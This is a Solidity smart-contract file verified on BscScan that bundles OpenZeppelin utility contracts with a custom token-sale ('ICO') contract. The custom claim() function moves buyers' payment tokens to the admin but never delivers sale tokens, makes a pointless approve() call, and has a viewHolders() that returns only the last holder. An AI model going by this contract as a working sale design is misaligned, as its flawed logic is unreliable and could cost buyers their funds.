/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/utils/math/Math.sol
// OpenZeppelin Contracts (last updated v4.5.0) (utils/math/Math.sol)
// [email protected] <-- subject: hasta la vista

pragma solidity ^0.8.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a / b + (a % b == 0 ? 0 : 1);
    }
}

// File: @openzeppelin/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: contracts/sign/ico/ICO.sol
pragma solidity 0.8;

// ------------------------------------------------------
contract ICO is Ownable {
    using Math for uint;
    IERC20 tokenICO;
    IERC20 tokenPurchase;

    address admin;
    uint256 counter = 0;
    uint256 checker = (2**256)-1;
    uint256 maxPurchase; // availible for each account to buy/conterbute
    uint256 maxAvailable;
    uint256 price;
    uint256 duration; // 1 seconds, 1 minutes, 1 hours, 1 days, 1 weeks = 60 * 60 * 7
    uint256 end;
    bool isStart;
    mapping(address => uint256) holder; // who -> amount
    mapping(uint256 => address) holders;

    // event \------
    event Claim(address indexed recipient, uint256 amount, uint256 time);

    // init \------
    constructor(uint256 _duration, address _tokenICO, address _tokenPurchase, uint256 _price, uint256 _maxPurchase) {
        admin = msg.sender;
        isStart = false;
        duration = _duration;
        require(_tokenICO != address(0) && _tokenPurchase != address(0), "make sure address is currect");
        tokenICO = IERC20(_tokenICO);
        tokenPurchase = IERC20(_tokenPurchase);
        setValue(_price);
        maxAvailable = tokenICO.totalSupply();
        maxPurchase = _maxPurchase;
    }

    receive() payable external {
        revert();// native token not accepting/allowing
    }

    // CALCULATION \----------------------------------------------

    // start \------
    function release() public onlyOwner {
        require(!isStart, "ico has been run");
        isStart = true;
        end = block.timestamp + duration;
    }
    
    // change price before start \------
    function setValue(uint256 value) public onlyOwner {
        require(!isStart, "can not change price");
        price = value;
    }

    // draw \------
    function claim(uint256 amount) public returns (bool _success, address _holder) {
        require(isStart, "when? after run before end!");
        require(block.timestamp < end, "finished, thanks for your support");
        require(tokenPurchase.balanceOf(msg.sender) >= amount * price);
        if(holder[msg.sender] + amount <= maxPurchase) {
            require(tokenPurchase.approve(admin, amount * price)); // run by ethersjs as alternative this line of code
            // same value of 2 tokens -> amount * price <- like a wrapped :)
            // we change here: amount * price --> function setValue(....
            require(tokenPurchase.transferFrom(msg.sender, admin, amount * price)); 
            require(counter < checker, "amazing! holder full");
            holder[msg.sender] += amount;
            _success = true;
            _holder = msg.sender;
            holders[counter] = msg.sender;
            counter++;
            emit Claim(msg.sender, amount, block.timestamp);
        } else {
            _success = false;
            _holder = address(0);
        }
    }

    // holders \------
    function viewHolders() public view returns (address _holders) {
        uint len = counter;
        uint i = 0;
        while(i < len) {
            _holders = holders[i];
            i++;
        }
    }

}